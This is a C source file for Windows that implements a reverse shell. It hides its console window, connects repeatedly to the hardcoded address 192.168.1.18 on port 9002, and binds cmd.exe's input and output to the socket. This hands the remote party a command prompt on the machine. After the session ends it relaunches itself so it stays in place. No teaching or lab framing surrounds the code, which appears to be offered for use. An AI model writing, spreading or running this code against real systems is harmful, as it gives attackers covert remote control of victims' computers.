#include <winsock2.h>
#include <stdio.h>
#include <Windows.h>
#include <ws2tcpip.h>
#include <string.h>
#pragma comment(lib, "Ws2_32.lib")


int main(int argc, int **argv){
    FreeConsole();
    SOCKET shell;
    struct sockaddr_in shell_addr;
    WSADATA wsa;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char RecvServer[512];
    char ip_addr[]="192.168.1.18";
    int port=9002;
    int connection;
    int waitTime=5000;

    WSAStartup(MAKEWORD(2, 2), &wsa);  //Init WinSock2
    shell=WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);  //Create the TCP socket

    shell_addr.sin_port=htons(port);
    shell_addr.sin_family=AF_INET;
    shell_addr.sin_addr.s_addr=inet_addr(ip_addr);
    while(1){
        connection=WSAConnect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);  //Connect to the target server
        if(connection==SOCKET_ERROR){
            printf("[!]  Connection failed.\nTrying again in %d seconds.\n", waitTime/1000);
            Sleep(waitTime);
        }else{
            printf("Connection Succeeded.\n");
            recv(shell, RecvServer, sizeof(RecvServer), 0);
            memset(&si, 0, sizeof(si));
            si.cb=sizeof(si);
            si.dwFlags=(STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW);
            si.hStdInput=si.hStdOutput=si.hStdError=(HANDLE) shell;  //Pipes std inp, outp, err to the socket
            CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);  //Spawns the command prompt
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            memset(RecvServer, 0, sizeof(RecvServer));
            printf("Connection Closed\n");
            char command[512]="start ";
            strcat(command, argv[0]);
            // printf(command);
            system(command);
            free(*command);
            exit(0);
        }
    }
}